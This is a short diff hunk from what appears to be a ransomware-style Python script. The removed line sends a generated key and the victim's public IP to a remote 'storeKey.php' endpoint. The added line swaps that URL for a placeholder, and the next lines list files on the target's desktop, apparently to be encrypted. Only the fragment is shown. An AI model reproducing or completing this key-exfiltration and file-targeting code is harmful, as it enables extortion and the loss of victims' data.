@@ -30,7 +30,7 @@ for i in range(10):
 
 ipAddr = requests.get("http://checkip.amazonaws.com/")
 
-data = requests.get("http://500iqproject.atwebpages.com/storeKey.php?str=" + finalKey + "&ip=" + ipAddr.text)
+data = requests.get("links" + finalKey + "&ip=" + ipAddr.text)
 
 #get file list in desktop
 targetFList = [f for f in listdir(targetDir) if isfile(join(targetDir, f))]
